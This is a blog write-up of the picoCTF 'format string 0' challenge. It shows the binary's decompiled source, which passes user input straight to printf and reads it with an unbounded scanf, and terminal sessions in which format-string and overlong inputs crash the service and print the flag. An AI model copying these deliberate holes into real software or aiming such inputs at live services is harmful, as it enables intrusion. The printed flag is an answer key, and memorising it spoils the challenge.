---
title: PicoCTF - format string 0
published: 2025-08-08
description: PicoCTF Writeup for format string 0 Challenge
tags: [binary exploitation, easy, picoCTF 2024]
category: PicoCTF Writeup
draft: false
lang: en
---

# PicoCTF Writeup - format string 0

BNDB (Binary Ninja Database): [/bndb/202508080956.bndb](/blog/bndb/202508080956.bndb)

PicoCTF Challenge: 
[https://play.picoctf.org/practice/challenge/433?category=6&page=1](https://play.picoctf.org/practice/challenge/433?category=6&page=1)

> ## format string 0
> Author: Cheng Zhang
> 
> ### Description
> Can you use your knowledge of format strings to make the customers happy?<br>
> Download the binary here.<br>
> Download the source here.<br>
> Additional details will be available after launching your challenge instance.<br>
> ### Hints
> 1st - This is an introduction of format string vulnerabilities. Look up "format specifiers" if you have never seen them before.<br>
> 2nd - Just try out the different options<br>
> ### Resources:
> Source Code: [/format-string-0.c](https://artifacts.picoctf.net/c_mimas/77/format-string-0.c)<br>
> Binary: [/format-string-0](https://artifacts.picoctf.net/c_mimas/77/format-string-0)<br>

```bash title="Server Information"
$ nc mimas.picoctf.net 60589
```

There are two different methods to solve this challenge.

## Decompile

We can decompile the binary to a pseudo C like this (Binary Ninja):

```c title="/format-string-0_original.c"
00401276    void sigsegv_handler() __noreturn

00401276    {
00401294        printf("\n%s\n", &flag);
004012a3        fflush(stdout);
004012ad        exit(1);
004012ad        /* no return */
00401276    }

/* ... */

004012b2    int on_menu(char* user_input, char** menu_item, int list_size)

004012b2    {
004012b2        int index = 0;
004012b2        
0040130d        while (true)
0040130d        {
0040130d            if (index >= list_size)
0040130f                return 0;
0040130f            
004012fa            /* Compares each characters */
004012fa            if (!strcmp(user_input, menu_item[index]))
004012fa                break;
004012fa            
00401303            index += 1;
0040130d        }
0040130d        
004012fc        return 1;
004012b2    }

/* ... */

004014c3    int serve_bob()

004014c3    {
004014c3        printf("\n%s %s\n%s %s\n%s %s\n%s", "Good job! Patrick is happy!", 
004014c3            "Now can you serve the second customer?", "Sponge Bob wants something outrageous that would break the shop", 
004014c3            "(better be served quick before the shop owner kicks you out!)", "Please choose from the following burgers:", 
004014c3            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak", "Enter your recommendation: ");
00401511        fflush(stdout);

00401527        char format[32];
00401527        scanf("%s", &format);

0040152c        char *items[] = {
                    "Pe%to_Portobello",
                    "$outhwest_Burger",
                    "Cla%sic_Che%s%steak"
                };

0040153c        
0040155e        if (!on_menu(&format, &itmes, 3))
0040155e        {
00401587            printf("There is no such burger yet!");
00401574            return fflush(stdout);
0040155e        }
0040155e        
00401587        printf(&format);
00401596        return fflush(stdout);
004014c3    }


/* ... */

004013bb    int serve_patrick()

004013bb    {
004013bb        printf("%s %s\n%s\n%s %s\n%s", "Welcome to our newly-opened burger place Pico 'n Patty!", 
004013bb            "Can you help the picky customers find their favorite burger?", "Here comes the first customer Patrick who wants a giant bite.", 
004013bb            "Please choose from the following burgers:", "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe", 
004013bb            "Enter your recommendation: ");
00401408        fflush(stdout);

0040141e        char format[44];
0040141e        scanf("%s", &format);

00401423        char *items[] = {
                    "Breakf@st_Burger",
                    "Gr%114d_Cheese",
                    "Bac0n_D3luxe"
                };

00401433        
00401455        if (!on_menu(&format, &items, 3))
00401455        {
0040147e            printf("There is no such burger yet!");
0040146b            return fflush(stdout);
00401455        }
00401455        
0040148a        if (printf(&format) > 0x40)
004014ac            return serve_bob();
004014ac        
004014ac        printf("%s\n%s\n", "Patrick is still hungry!", "Try to serve him something of larger size!");
004014bb        return fflush(stdout);
004013bb    }

/* ... */

00401316    int main()

00401316    {
00401333        FILE* fp = fopen("flag.txt", "r");
00401333        
00401341        if (!fp)
00401341        {
00401377            printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n");
00401361            exit(0);
00401361            /* no return */
00401341        }
00401341        
00401377        fgets(&flag, 64, fp);
00401386        signal(SIGSEGV, sigsegv_handler);
0040138b        gid_t gid = getegid();
004013a5        setresgid(gid, gid, gid);
004013af        serve_patrick();
004013ba        return 0;
00401316    }

```

This is the full source code (decompiled):

```c title="/format-string-0.c"
void sigsegv_handler()
{
    printf("\n%s\n", &flag);
    fflush(stdout);
    exit(1);
}

int serve_bob()
{
    printf("\n%s %s\n%s %s\n%s %s\n%s", "Good job! Patrick is happy!", 
        "Now can you serve the second customer?", "Sponge Bob wants something outrageous that would break the shop", 
        "(better be served quick before the shop owner kicks you out!)", "Please choose from the following burgers:", 
        "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak", "Enter your recommendation: ");
    fflush(stdout);

    char format[32];
    scanf("%s", &format);

    char *items[] = {
        "Pe%to_Portobello",
        "$outhwest_Burger",
        "Cla%sic_Che%s%steak"
    };

    
    if (!on_menu(&format, &itmes, 3))
    {
        printf("There is no such burger yet!");
        return fflush(stdout);
    }
    
    printf(&format);
    return fflush(stdout);
}

int serve_patrick()
{
    printf("%s %s\n%s\n%s %s\n%s", "Welcome to our newly-opened burger place Pico 'n Patty!", 
        "Can you help the picky customers find their favorite burger?", "Here comes the first customer Patrick who wants a giant bite.", 
        "Please choose from the following burgers:", "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe", 
        "Enter your recommendation: ");
    fflush(stdout);

    char format[44];
    scanf("%s", &format);

    char *items[] = {
        "Breakf@st_Burger",
        "Gr%114d_Cheese",
        "Bac0n_D3luxe"
    };

    
    if (!on_menu(&format, &items, 3))
    {
        printf("There is no such burger yet!");
        return fflush(stdout);
    }
    
    if (printf(&format) > 0x40)
        return serve_bob();
    
    printf("%s\n%s\n", "Patrick is still hungry!", "Try to serve him something of larger size!");
    return fflush(stdout);
}

int main()
{
    FILE* fp = fopen("flag.txt", "r");
    
    if (!fp)
    {
        printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n");
        exit(0);
    }
    
    fgets(&flag, 64, fp);

    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
    return 0;
}
```

## Analysis

A close inspection of the program’s decompiled code reveals that special characters with `%` are printed in `printf()`. By selecting an appropriate format string as input, you can have that format string printed and cause a segmentation fault.

The string `Gr%114d_Cheese` prints a specific number of spaces on the screen, followed by additional strings. The code below calls `serve_bob()` if the number of characters printed by printf exceeds 64.

```c
if (printf(&format) > 0x40) /* 0x40 => 64 */  
    return serve_bob();
```

The string `Cla%sic_Che%s%steak` calls `%s` a total of 3 times. In the `printf()` statement containing this string, `%s` is called 6 times in total to print the string. By attempting to call 3 additional non-existent strings, a **segmentation fault** is triggered.



```bash
therustymate-picoctf@webshell:~$ nc mimas.picoctf.net 60589
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}

therustymate-picoctf@webshell:~$ 
```

The flag is: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}`

---

This program has a system that reads the flag from flag.txt and outputs it if a segmentation fault occurs.
Therefore, you can obtain the flag by causing a segmentation fault in the program.

The program takes input via `scanf()` into a 44-byte or 32-byte variable without size validation, so entering a value exceeding this limit triggers a **segmentation fault** and causes the flag to be printed.

```bash
therustymate-picoctf@webshell:~$ nc mimas.picoctf.net 60589
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```

The flag is: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}`